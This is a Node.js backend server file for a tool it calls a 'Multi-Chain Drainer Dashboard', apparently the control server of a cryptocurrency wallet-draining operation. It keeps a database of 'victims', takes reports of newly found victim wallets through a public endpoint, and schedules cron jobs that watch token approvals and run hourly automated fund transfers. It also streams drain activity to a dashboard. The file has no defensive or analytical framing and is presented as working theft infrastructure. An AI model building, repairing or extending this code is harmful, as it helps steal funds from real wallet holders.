#!/usr/bin/env node

/**
 * G0DM0D3-DCrypt v3.0 Backend Server
 * Advanced Multi-Chain Drainer Dashboard
 */

require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const morgan = require('morgan');
const cron = require('node-cron');
const WebSocket = require('ws');
const winston = require('winston');
const path = require('path');

// Import services
const ChainManager = require('./services/ChainManager');
const OffensiveTools = require('./services/OffensiveTools');
const DrainMonitor = require('./services/DrainMonitor');

// Import routes
const authRoutes = require('./routes/auth');
const dashboardRoutes = require('./routes/dashboard');
const victimsRoutes = require('./routes/victims');
const transactionsRoutes = require('./routes/transactions');
const settingsRoutes = require('./routes/settings');

// Import middleware
const {
    authenticateToken,
    rateLimiter,
    apiRateLimiter,
    requestLogger,
    securityHeaders,
    corsOptions
} = require('./middleware/auth');
const { errorHandler, notFoundHandler } = require('./middleware/errorHandler');

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 3003;

// Logger setup
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.errors({ stack: true }),
        winston.format.json()
    ),
    defaultMeta: { service: 'godmod-dcrypt-backend' },
    transports: [
        new winston.transports.File({ filename: 'logs/error.log', level: 'error' }),
        new winston.transports.File({ filename: 'logs/combined.log' }),
        new winston.transports.Console({
            format: winston.format.combine(
                winston.format.colorize(),
                winston.format.simple()
            )
        })
    ]
});

// Security middleware
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
        },
    },
}));

app.use(securityHeaders);
app.use(compression());
app.use(cors(corsOptions));

// Rate limiting
app.use('/api/', apiRateLimiter);

// Request logging
app.use(requestLogger);

// Logging
app.use(morgan('combined', {
    stream: {
        write: (message) => logger.info(message.trim())
    }
}));

// Body parsing
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Static files
app.use('/uploads', express.static(path.join(__dirname, '../uploads')));
app.use('/logs', express.static(path.join(__dirname, '../logs')));

// Database connection
const mongoUri = process.env.MONGODB_URI;

if (!mongoUri) {
    logger.warn('MONGODB_URI not found in .env, falling back to local MongoDB for development');
}

mongoose.connect(mongoUri || 'mongodb://localhost:27017/godmod-dcrypt', {
    useNewUrlParser: true,
    useUnifiedTopology: true,
    serverSelectionTimeoutMS: 5000,
    socketTimeoutMS: 45000,
    dbName: 'godmod-dcrypt' // Explicitly set database name for Atlas
})
.then(() => {
    logger.info('Connected to MongoDB (Cloud/Local)');
    console.log('🔗 Connected to MongoDB');
})
.catch(err => {
    logger.error('MongoDB connection error:', err);
    console.error('❌ MongoDB connection failed:', err.message);
    // In production (Cloud), we might want to exit if DB is not available
    if (process.env.NODE_ENV === 'production') {
        process.exit(1);
    }
});

// Initialize services
const chainManager = new ChainManager();
const offensiveTools = new OffensiveTools();
const drainMonitor = new DrainMonitor();

// Routes
app.use('/api/auth', authRoutes);

// Public reporting route for victims
app.post('/api/report/victim', async (req, res, next) => {
    try {
        const { address, network, walletType, labels, riskLevel, notes } = req.body;
        const Victim = require('./models/Victim');
        
        let victim = await Victim.findOne({ address: address.toLowerCase(), network });
        
        if (!victim) {
            victim = new Victim({
                address: address.toLowerCase(),
                network,
                walletType,
                labels,
                riskLevel,
                notes,
                status: 'active'
            });
            await victim.save();
            console.log(`📡 Public Report: New victim discovered: ${address} on ${network}`);
        } else {
            victim.lastSeen = new Date();
            if (notes) victim.notes = (victim.notes || '') + '\n' + notes;
            await victim.save();
        }
        
        res.status(201).json({ success: true });
    } catch (error) {
        next(error);
    }
});

app.use('/api/dashboard', authenticateToken, dashboardRoutes);
app.use('/api/victims', authenticateToken, victimsRoutes);
app.use('/api/transactions', authenticateToken, transactionsRoutes);
app.use('/api/settings', authenticateToken, settingsRoutes);

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        version: '3.0.0'
    });
});

// WebSocket server for real-time updates
const wss = new WebSocket.Server({ port: 3002 });

wss.on('connection', (ws) => {
    console.log('🔌 WebSocket client connected');

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            handleWebSocketMessage(ws, data);
        } catch (err) {
            logger.error('WebSocket message error:', err);
        }
    });

    ws.on('close', () => {
        console.log('🔌 WebSocket client disconnected');
    });
});

function handleWebSocketMessage(ws, data) {
    switch (data.type) {
        case 'subscribe_dashboard':
            // Send real-time dashboard updates
            drainMonitor.subscribe(ws);
            break;
        case 'unsubscribe_dashboard':
            drainMonitor.unsubscribe(ws);
            break;
        default:
            ws.send(JSON.stringify({ error: 'Unknown message type' }));
    }
}

// Cron jobs for automated tasks
cron.schedule('*/5 * * * *', async () => {
    try {
        console.log('🔄 Running automated drain checks...');
        await offensiveTools.checkForNewVictims();
        await chainManager.monitorApprovals();
    } catch (err) {
        logger.error('Cron job error:', err);
    }
});

cron.schedule('0 */1 * * *', async () => {
    try {
        console.log('💰 Running fund transfer automation...');
        await offensiveTools.transferFunds();
    } catch (err) {
        logger.error('Fund transfer error:', err);
    }
});

cron.schedule('0 0 * * *', async () => {
    try {
        console.log('🧹 Running cleanup tasks...');
        await offensiveTools.cleanupOldData();
    } catch (err) {
        logger.error('Cleanup error:', err);
    }
});

// Error handling
app.use(errorHandler);

// 404 handler
app.use(notFoundHandler);

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('🛑 Received SIGTERM, shutting down gracefully...');
    mongoose.connection.close();
    wss.close();
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('🛑 Received SIGINT, shutting down gracefully...');
    mongoose.connection.close();
    wss.close();
    process.exit(0);
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 G0DM0D3-DCrypt Backend Server v3.0 running on port ${PORT}`);
    console.log(`🔗 WebSocket server running on port 3002`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/api/dashboard`);
    console.log(`❤️  Health check: http://localhost:${PORT}/health`);

    logger.info(`Server started on port ${PORT}`);
});

// Export for testing
module.exports = app;